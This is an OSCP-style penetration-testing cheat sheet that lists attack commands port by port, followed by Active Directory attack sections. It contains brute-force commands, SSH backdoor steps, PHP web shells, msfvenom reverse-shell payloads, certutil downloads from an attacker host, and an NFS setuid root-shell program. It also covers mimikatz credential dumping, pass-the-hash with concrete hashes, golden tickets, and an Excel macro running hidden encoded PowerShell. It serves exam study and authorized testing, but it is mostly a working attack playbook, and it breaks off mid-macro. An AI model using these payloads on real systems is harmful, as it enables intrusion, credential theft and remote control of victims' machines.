# DigitalDefence Cheat Sheet for OSCP

## Enumeration:

1. nmapAutomator:
	```
	nmapAutomator.sh -H IP -t All
	```
2. autorecon:
	```
	autorecon IP
	```
3. nmap:
	```
	nmap -T4 -A -p- IP
	```
4. enum4linux:
	```
	enum4linux -a IP
	```
5. wfuzz
	```
	wfuzz -c -z range,1-65535 --hl=2 http://IP:PORT/url.php?path=FUZZ
	wfuzz -w /usr/share/wordlists/wfuzz/Injections/All_attack.txt http://IP:PORT/index.html?parameter=FUZZ
	```

## Port Enumeration and Potential Exploits:

### 21 (FTP):
1. Anonymous login is possible:
	```
	ftp IP
	ftp> USER anonymous
	ftp> PASS 
	```
2. View of FTP content:
	```
	ftp://IP
	```
3. Get files from FTP:
	```
	PASSIVE
	BINARY
	get FILE
	```
4. Upload files to FTP:
	```
	PASSIVE
	BINARY
	put FILE
	```
5. Brute force:
	```
	hydra -V -f -L USER_LIST -P /usr/share/wordlists/rockyou.txt ftp://IP -u -vV
	```
6. Vulnerability Scanning:
	```
	nmap -p 21 --script="+*ftp* and not brute and not dos and not fuzzer" -vv -oN ftp IP
	```

### 22 (SSH)
1. Brute Force:
	```
	hydra -V -f -L <USERS_LIST> -P /usr/share/wordlists/rockyou.txt ssh://IP -u -vV
	```
2. Possible Exploit: CVE-2008-0166:
	```
	searchsploit -m 5720
	```
3. Backdoor (might be worth it):
	```
	-> Attacker
	ssh-keygen -f FILE
	chmod 600 FILE
	cat FILE.pub -> copy

	-> Victim
	echo FILE.pub >> PATH/.ssh/authorized_keys

	-> Connect
	ssh -i FILE USER@IP
	```
4. Banner grab:
	```
	ssh root@IP
	```

### 23 (Telnet)
1. Connect:
	```
	telnet IP 23
	```

### 25 (SMTP)
1. Connect:
	```
	nc IP 25
	```
2. User enumeration:
	```
	VRFY USER
	```

### 43 (WHOIS)
1. Connection:
	```
	whois -h IP -p PORT "domain.tld"
	```

### 53 (DNS)
1. Enumeration:
	```
	dnsenum DOMAIN
	dnsrecon -d DOMAIN

	nslookup
	nslookup> server IP
	nslookup> DOMAIN
	```
2. Zone Transfer
	```
	dnsrecon -d DOMAAIN -a
	dig axfr DOMAIN @website
	```
3. DNS Brute force:
	```
	https://github.com/blark/aiodnsbrute
	```

### 69 (TFTP)
1. Enumeration
	```
	nmap -n -Pn -sU -p69 -sV --script tftp-enum IP
	```

### 79 (Finger)
1. User Enumeration
	```
	finger IP
	finger USER@IP
	```
2. Command execution:
	```
	finger "|/bin/id@<IP>"
	finger "|/bin/ls -a /<IP>"
	```

### 80 & 443 (HTTP):
1. Enumeration:
	```
	done by automatic scripts
	check https://github.com/pwnwiki/webappdefaultsdb/blob/master/README.md
	```
2. Directory Fuzzing:
- GoBuster:
	```
	gobuster dir -u http://IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20
	gobuster dir -u http://IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20 -x php,txt,html,cgi,sh,bak,aspx
	gobuster dir -u http://IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20 -x php,txt,html,cgi,sh,bak,aspx --insecuressl
	```
(might have to use `-k` switch if HTTPS is not trustable)
- Dirbuster
	```
	trivial
	```
	(Do not forget to change file formats and supply correct directory list like above)

3. **Wordpress**
- _Enumeration_
	```
	\# Scan
	wpscan --rua -e --url IP/URL
	\# Brute force users/login
	wpscan --rua --url IP/URL -P /usr/share/wordlists/rockyou.txt -U "USER,USER"
	\# Plugin and theme enumeration
	wpscan --url URL --enumerate ap,at --plugins-detection mixed
	```
- _Theme RCE_
	```
	Appearance -> Editor -> 404 Template (at the right)
	Change the content for a php shell
	https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
	http://<IP>/wp-content/themes/twentytwelve/404.php
	```
- _Plugin RCE_
	Follow this [Link](https://medium.com/swlh/wordpress-file-manager-plugin-exploit-for-unauthenticated-rce-8053db3512ac)
4. **Drupal**
- _Enumeration_
	```
	python3 drupwn --mode enum --target URL
	```
- _User Enumeration_
	```
	In /user/register just try to create a username and if the name is already taken it will be notified :
	*The name admin is already taken*
	If you request a new password for an existing username :
	*Unable to send e-mail. Contact the site administrator if the problem persists.*
	If you request a new password for a non-existent username :
	*Sorry, test is not recognized as a user name or an e-mail address.*
	Accessing /user/<number> you can see the number of existing users :
	/user/1 -> Access denied (user exist)
	/user/2 -> Page not found (user doesn't exist)
	```
- _Hidden Pages Enumeration_
	```
	wfuzz -c -z range,1-500 --hc 404 URL/node/FUZZ
	```
- _Panel RCE_
	```
	You need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)
	Go to Modules -> (Check) PHP Filter  -> Save configuration
	https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
	Then click on Add content -> Select Basic Page or Article -> Write php shellcode on the body -> Select PHP code in Text format -> Select Preview
	```
5. **Joomla**
- _Enumeration_
	```
	joomscan -u URL
	./joomlavs.rb --url URL -a -v
	```
6. **Tomcat**
- _Default Credentials_
	```
	The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are :
	```
	```
	admin:admin
	tomcat:tomcat
	admin:<NOTHING>
	admin:s3cr3t
	tomcat:s3cr3t
	admin:tomcat
	```
- _Brute Force_
	```
	hydra -L USER_LIST -P /usr/share/wordlists/rockyou.txt -f IP http-get /manager/html -vV -u
	```
- _Panel RCE_
	```
	\# Generate payload
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
	```
	```
	\# Upload payload
	Tomcat6 :
	wget 'http://USER:PASSWORD@IP:8080/manager/deploy?war=file:shell.war&path=/shell' -O -
	```
	```
	Tomcat7 and above :
	curl -v -u USER:PASSWORD -T shell.war 'http://IP:8080/manager/text/deploy?path=/shellh&update=true'
	```
	```
	\# Listener
	nc -nvlp PORT
	```
	```
	\# Execute payload
	curl http://IP:8080/shell/
	```
7. **WebDav**
	```
	davtest -url URL
	```
8. HTTP Brute Force Authentication
- _HTTP Basic Authentication_
	```
	\# Hydra
	hydra -l USER -V -P /usr/share/wordlists/rockyou.txt -s 80 -f IP http-get /URL_ENDPOINT/ -t 15
	```
- _HTTP GET request_
	```
	hydra IP -V -l USER -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes;PHPSESSID=12345myphpsessid" -t 15
	```
- _HTTP POST request_
	```
	hydra -l USER -P /usr/share/wordlists/rockyou.txt IP http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t 15
	```
9. Spider / Brute force directories / files
	```
	gospider -d DEPTHS --robots --sitemap -t 15 -s URL
	```
	```
	ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u URL/FUZZ -e .php,.txt -t 15
	```
	```
	Dictionaries :
	/usr/share/wordlists/dirb/common.txt
	/usr/share/wordlists/dirb/big.txt
	/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	```
	_File backups_
	```
	file.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old
	```
10. Local File / Remote File Inclusion (LFI/RFI):
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
	```
- Wrappers
	```
	\# php://filter
	http://example.com/index.php?page=php://filter/convert.base64-encode/resource=
	\# expect://
	http://example.com/index.php?page=expect://id
	\# data://
	echo '<?php phpinfo(); ?>' | base64 -w0 -> PD9waHAgcGhwaW5mbygpOyA/Pgo=
	http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=
	If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.
	Code execution with 
	exec
	shell_exec
	system
	passthru
	popen
	\# Example
	echo '<?php passthru($_GET["cmd"]);echo "Shell done !"; ?>' | base64 -w0 -> PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=
	http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=
	If there is "Shell done !" on the webpage, then there is code execution and you can do things like :
	http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&cmd=ls
	\# input://
	curl -k -v "http://example.com/index.php?page=php://input" --data "<?php echo shell_exec('id'); ?>"
	```
- Useful LFI lists
	```
	\Linux
	/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
	\Windows
	/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
	\# Both
	/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
	```
- Tools
	```
	kadimus --url URL
	python lfisuite.py
	```
11. Command Injection
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
	Burp!
	```
12. Deserialization
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
	```
13. File Upload
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
	```
14. SQL Injection
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
	https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli
	```
15. XSS
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
	beef-xss
	cat /usr/share/beef-xss/config.yaml | grep user -C 1 # user / password
	<script src="http://IP:3000/hook.js"></script>
	```
16. Upload a file with PUT
	```
	curl -X PUT http://IP/FILE -d @FILE  -v
	```

### 88 (Kerberos)
1. Enumeration
	```
	nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
	https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
	```

### 110 (POP3)
1. Brute Force
	```
	hydra -l USER -P /usr/share/wordlists/rockyou.txt -f IP pop3 -V
	hydra -S -v -l USER -P /usr/share/wordlists/rockyou.txt -s 995 -f IP pop3 -V
	```
2. Read mail
	```
	telnet IP 110
	USER USER
	PASS PASSWORD
	LIST
	RETR MAIL_NUMBER
	QUIT
	```
	
### 111 (RPC/NFS)
1. Enumeration
	```
	nmap -sV -p 111 --script=rpcinfo IP
	nmap -p 111 -script nfs* IP
	```
2. Mountable Drives
	```
	showmoun -e IP
	```
3. Mounting
	```
	mount -t nfs -o vers=3 IP:/SHARE /mnt
	groupadd --gid 1337 pwn
	useradd --uid 1337 -g pwn pwn
	```

### 161 (SNMP)
1. Brute force community string:
	```
	onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>
	snmpbulkwalk -c <COMMUNITY_STRING> -v<VERSION> IP
	snmp-check IP
	nmap -sU -sV -sC --open -p 161 IP
	```
2. Modifying SNMP values
	```
	http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html
	```
	
### 139/445 (SMB/Samba)
1. Enumeration:
	```
	nmap -Pn -n -p139,445 --script smb-* IP
	enum4linux -a IP
	```
2. Hostname Enumeration:
	```
	nmblookup -A IP
	```
3. Version enumeration:
	```
	./smbver.sh IP PORT
	```
4. Share enumeration:
	```
	smbclient -L \\IP -N --option='client min protocol=NT1'
	smbclient -L \\IP -U USER
	smbclient -L IP
	smbclient -L --no-pass -L //$IP
	```
5. Brute force
	```
	hydra -V -f -L USERS -P /usr/share/wordlists/rockyou.txt smb://IP -u -vV
	```
6. Mount
	```
	mkdir /tmp/share
	sudo mount -t cifs //<IP>/<SHARE> /tmp/share
	sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /tmp/share
	```
7. Shell inclusion:
	```
	psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
	psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
	wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
	wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
	smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
	smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
	```
8. Useful exploits
	```
	EternalBlue (MS17-010)
	MS08-067
	CVE-2017-7494
	
	```
9. Change Samba protocol version Connection
	```
	sudo vim /etc/samba/smb.conf
	min protocol = SMB2
	sudo /etc/init.d/smbd restart
	```

### 389,636 (LDAP)
1. Enumeration
	```
	nmap -n -sV --script "ldap* and not brute" IP
	ldapsearch -h <IP> -x -s base
	ldapsearch -h <IP> -x -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
	```
2. Graphical Interface
	```
	jxplorer
	```

### 1433 (MSSQL)
1. Enumeration
	```
	nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 IP
	```
2. Brute force
	```
	hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
	```
3. After having credentials
	```
	mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
	mssqlclient.py <USER>:<PASSWORD>@<IP>
	\# Once logged in you can run queries:
	SQL> select @@ version;
	\# Steal NTLM hash
	sudo smbserver.py -smb2support liodeus .
	SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat
	\# Try to enable code execution
	SQL> enable_xp_cmdshell
	\# Execute code
	SQL> xp_cmdshell whoami /all
	SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
	```
4. Manual
	```
	https://www.asafety.fr/mssql-injection-cheat-sheet/
	```
	
### 2049 (NFS)
1. Mountable NFS Shares
	```
	showmount -e <IP>
	nmap --script=nfs-showmount -oN mountable_shares IP
	```
2. Mounting
	```
	sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
	sudo mount -v -t nfs -o vers=2 <IP>:<SHARE> <DIRECTORY>
	```
3. NFS Misconfig
	```
	cat /etc/exports
	If you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.
	\# Attacker, as root user
	mkdir <DIRECTORY>
	mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
	cd <DIRECTORY>
	echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
	gcc pwn.c -o pwn
	chmod +s pwn
	\# Victim
	cd <SHARE>
	./pwn # Root shell
	```
### 3306 (MYSQL)
1. Brute Force
	```
	hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
	```
2. Extracting credentials
	```
	cat /etc/mysql/debian.cnf
	grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
	```
3. Connect
	```
	mysql -u USER
	mysql -u USER -p
	mysql -h IP -u USER
	```
4. MySQL Commands:
	```
	show databases;
	use <DATABASES>;
	show tables;
	describe <TABLE>;
	select * from <TABLE>;
	\# Try to execute code
	select do_system('id');
	\! sh
	\# Read & Write
	select load_file('<FILE>');
	select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
	```
5. Manual
	```
	https://www.asafety.fr/mysql-injection-cheat-sheet/
	```
### 3389 (RDP)
1. Brute force
	```
	hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV
	```
2. Connect
	```
	rdesktop -u <USERNAME> <IP>
	rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <IP>
	xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP>
	xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>
	```
3. Session Stealing
	```
	query user
	tscon <ID> /dest:<SESSIONNAME>
	```
4. Adding user to RDP Group
	```
	net localgroup "Remote Desktop Users" <USER> /add
	```
### 5800 - 5801 - 5900 - 5901 (VNC)
1. Scans
	```
	nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>
	```
2. Brute Force
	```
	hydra -L <USERS_LIST> –P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV
	```
3. Connect
	```
	vncviewer <IP>:<PORT>
	```
4. Password Location
	```
	\# Linux
	Default password is stored in: ~/.vnc/passwd
	\# Windows
	HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
	HKEY_CURRENT_USER\Software\TightVNC\Server
	HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
	C:\Program Files\UltraVNC\ultravnc.ini
	```
5. Decrypting 
	```
	msfconsole
	irb
	fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
	require 'rex/proto/rfb'
	Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
	/dev/nul
	```
### 5985-5986 (WINRM)
1. Brute force
	```
	crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
	```
2. Connect
	```
	evil-winrm -i <IP> -u <USER> -p <PASSWORD>
	evil-winrm -i <IP> -u <USER> -H <HASH>
	```
	
## Low Privilege Exploitation

## System Enumeration

## High Privilege Exploitation
	
## Post Exploitation

### Port Forwarding
Do not forget to to check /root/port_forwarding_and_tunneling/ssh_renote_port_forwarding.sh
	```
	cat /root/port_forwarding_and_tunneling/ssh_renote_port_forwarding.sh
	/root/port_forwarding_and_tunneling/ssh_renote_port_forwarding.sh
	```
1. **RINETD**
Internet traffic on port 80 redirection from Kali to Victim
	```
	vim /etc/rinetd.conf
	0.0.0.0 80 IP 80
	sudo service rinetd restart
	\# Check kali listenening
	ss -antp | grep "80"
	\# Test
	nc -nvv KALI-IP 80
	```

2. **SSH Tunneling**
	```
	ssh -N -L LIP:LPORT:RHOST:RPORT USER@GATEWAY
	/# Now we are able to connect to the the machine : for example, smbmap
	smbclient -L 127.0.0.1 -U Administrator
	```

3. **SSH Remote Port Forwarding**
	```
	\# Setup listener in Kali
	ssh -N -R KALI-IP:LPORT:127.0.0.1:RPORT KALI@KALI-IP
	\# Check kali listenening
	ss -antp | grep "LPORT"
	```
	
4. **SSH Dynamic Port Forwarding and ProxyChains usage**
	```
	ssh -N -D 127.0.0.1:LPORT USER@RHOST
	vim /etc/proxychains.conf
	socks4	127.0.0.1:LPORT
	sudo proxychains nmap --top-ports=20 -sT -Pn TARGETIP
	```
	
5. **PLINK.exe**
	```
	\# Check ports listenening
	netstat -anpb tcp 
	cmd.exe /c echo y | plink.exe s\=ssh -l kali -pw ilak -R KALI-IP:LPORT:127.0.0.1:RPORT KALI-IP
	\# In Kali
	sudo nmap -sS -sV 127.0.0.1 -p LPORT
	```

6. **NETSH**
	```
	netsh interface portproxy add v4tov4 listenport=LPORT listenaddress=LHOST connectport=RPORT connectaddress=RHOST
	\# Avoid firewall
	netsh advfirewall firewall add rule name ="forward_port_rule" protocol=TCP dir=in localip=LHOST localport=LPORT action=allow
	\# In kali
	smbclient -L RHOST --port=LPORT --user=Administrator
	sudo mount -t cifs -o port=LPORT //RHOST/Data -o username=Administrator,password=password /mnt/win10_share
	ls -l /mnt/win10_share/
	```

7. **HTTPTunnel-ing Through Deep Packet Inspection**
	```
	apt-cache search httptunnel
	sudo apt install httptunnel
	ssh -L 0.0.0.0:LPORT:RHOST:RPORT USER@127.0.0.1
	\# After ssh, confirm 
	ss -antp | grep "8888"
	\# On kali
	htc --forward-port LPORT RHOST:RPORT
	\# Confirm
	ps aux | grep htc
	ss- antp | grep "8080"
	```

### Active Directory

**Enumeration**

1. Leveraging net.exe
	```
	\# Enumerate local accounts
	net user
	net user /domain
	net user user /domain
	net group /domain
	```
	
2. Lightweight Directory Access Protocol (LDAP)
	```
	LDAP://HostName[:PortNumber][/DistinbuisedName]
	[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	
	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	$PDC = ($domainObj.PdcRoleOwner).Name
	$SearchString = "LDAP://"
	$SearchString += $PDC + "/"
	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
	$SearchString += $DistinguishedName
	$SearchString
	
	LDAP://DC01.corp.com/DC=corp,DC=com
	
	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	$PDC = ($domainObj.PdcRoleOwner).Name
	$SearchString = "LDAP://"
	$SearchString += $PDC + "/"
	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
	$SearchString += $DistinguishedName
	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
	$objDomain = New-Object System.DirectoryServices.DirectoryEntry($SearchString,
	"corp.com\offsec", "lab")
	$Searcher.SearchRoot = $objDomain
	
	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	$PDC = ($domainObj.PdcRoleOwner).Name
	$SearchString = "LDAP://"
	$SearchString += $PDC + "/"
	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
	$SearchString += $DistinguishedName
	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
	$objDomain = New-Object System.DirectoryServices.DirectoryEntry
	$Searcher.SearchRoot = $objDomain
	$Searcher.filter="samAccountType=805306368"
	$Searcher.FindAll()
	
	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	$PDC = ($domainObj.PdcRoleOwner).Name
	$SearchString = "LDAP://"
	$SearchString += $PDC + "/"
	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
	$SearchString += $DistinguishedName
	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
	$objDomain = New-Object System.DirectoryServices.DirectoryEntry
	$Searcher.SearchRoot = $objDomain
	$Searcher.filter="samAccountType=805306368"
	$Result = $Searcher.FindAll()
	Foreach($obj in $Result)
	{
		Foreach($prop in $obj.Properties)
		{
			$prop
		}
		Write-Host "------------------------"
	}
	
	$Searcher.filter="name=Jeff_Admin"
	
	\# Resolving nested groups
	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	$PDC = ($domainObj.PdcRoleOwner).Name
	$SearchString = "LDAP://"
	$SearchString += $PDC + "/"
	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
	$SearchString += $DistinguishedName
	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
	$objDomain = New-Object System.DirectoryServices.DirectoryEntry
	$Searcher.SearchRoot = $objDomain
	$Searcher.filter="(objectClass=Group)"
	$Result = $Searcher.FindAll()
	Foreach($obj in $Result)
	{
		$obj.Properties.name
	}
	
	\# Dislaying Member Attribute
	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	$PDC = ($domainObj.PdcRoleOwner).Name
	$SearchString = "LDAP://"
	$SearchString += $PDC + "/"
	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
	$SearchString += $DistinguishedName
	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
	$objDomain = New-Object System.DirectoryServices.DirectoryEntry
	$Searcher.SearchRoot = $objDomain
	$Searcher.filter="(name=Secret_Group)"
	$Result = $Searcher.FindAll()
	Foreach($obj in $Result)
	{
		$obj.Properties.membe
	}
	
	\# Enumerating Nested Groups with Above Commands
	$Searcher.SearchRoot = $objDomain
	$Searcher.filter="(name=Nested_Group)
	OR
	$Searcher.SearchRoot = $objDomain
	$Searcher.filter="(name=Another_Nested_Group)"
	```

4. Currently Logged on Users
	```
	Import-Module .\PowerView.ps1
	Get-NetLoggedon -ComputerName client251
	Get-NetSession -ComputerName dc01
	```

5. Enumeration Through Service Principal Names
	```
	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	$PDC = ($domainObj.PdcRoleOwner).Name
	$SearchString = "LDAP://"
	$SearchString += $PDC + "/"
	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
	$SearchString += $DistinguishedName
	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
	$objDomain = New-Object System.DirectoryServices.DirectoryEntry
	$Searcher.SearchRoot = $objDomain
	$Searcher.filter="serviceprincipalname=*http*"
	$Result = $Searcher.FindAll()
	Foreach($obj in $Result)
	{
		Foreach($prop in $obj.Properties)
		{
			$prop
		}
	}
	
	nslookup CorpWebServer.corp.com \# service principalname
	```

**Active Directory Authentication**

1. NTLM Authentication
	```
	python Responder.py -l tun0 -rdw \# Capture the hash
	hashcat -m 5600 ntlm.txt /usr/share/wordlists/rockyou.txt
	```
2. SMB Relay
	```
	Edit reponder.conf -> SMB = Off, Http = Off
	python nmtlmrelayx.py -tf targets.txt -smb2support
	nmap --script=smb2-security-mode.nse -p445 ip.0/24
	mtlmrelayx.py -tf targets.txt -smb2support
	Point to attacker machine
	Connected to machine, forwarded to target, cracked
	nc ip 11000
	We are in SMB
	shares -> sharing files
	use C$ -> go to full control of whole computer
	```
3. Cached Credential Storage and Retrieval
	```
	mimikatz.exe
	privilege::debug
	sekurlsa::logonpasswords
	\# Get NTLM and SHA1 -> hashcat on them
	sekurlsa::tickets
	\# Look at Ticket Granting Service
	```
4. Service Account Attacks
	```
	Add-Type -AssemblyName System.IdentityModel
	New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList
	'HTTP/CorpWebServer.corp.com'
	klist
	kerberos::list /export \# Gets service ticket -> transfer to kali
	\# On kali
	sudo apt update && sudo apt install kerberoast
	python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
	```
5. Low and Slow Password Guessing
	```
	net accounts
	
	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	$PDC = ($domainObj.PdcRoleOwner).Name
	$SearchString = "LDAP://"
	$SearchString += $PDC + "/"
	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
	$SearchString += $DistinguishedName
	New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwerty09!")
	\# If successful 
	distinguishedName : {DC=corp,DC=com}
	Path : LDAP://DC01.corp.com/DC=corp,DC=com
	\# Otherwise : The user name or password is incorrect
	
	.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
	```

**Actice Directory Lateral Movement**

1. Pass the hash
	```
	\# On kali
	pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
	```
2. Overpass the hash
	```
	mimikatz.exe
	sekurlsa::logonpasswords
	sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
	klist \# Kerberos tickets
	net use \\dc01
	klist
	\# look at the client and server
	.\PsExec.exe \\dc01 cmd.exe
	ipconfig
	whoami
	```
3. Pass the Ticket
	```
	whoami /user
	mimikatz.exe
	kerberos::purge
	kerberos::list
	kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP/rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
	kerberos::list
	```
4. Distributed Component Object Model
	```
	$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
	$com | Get-Member TypeName: System.__ComObject#{000208d5-0000-0000-c000-000000000046}
	Sub mymacro()
		Shell ("notepad.exe")
	End Sub
	$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
	$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
	[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
	$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
	$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
	$temp = [system.io.directory]::createDirectory($Path)
	
	$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
	$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
	$RemotePath = "\\192.168.1.110\c$\myexcel.xls" [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
	$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
	$temp = [system.io.directory]::createDirectory($Path)
	$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
	$com.Run("mymacro")
	
	\# On kali
	msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
	
	str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
	n = 50
	for i in range(0, len(str), n):
		print "Str = Str + " + '"' + str[i:i+n] + '"'
		
	Sub MyMacro()
		Dim Str As String
		Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
		Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
		...
		Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
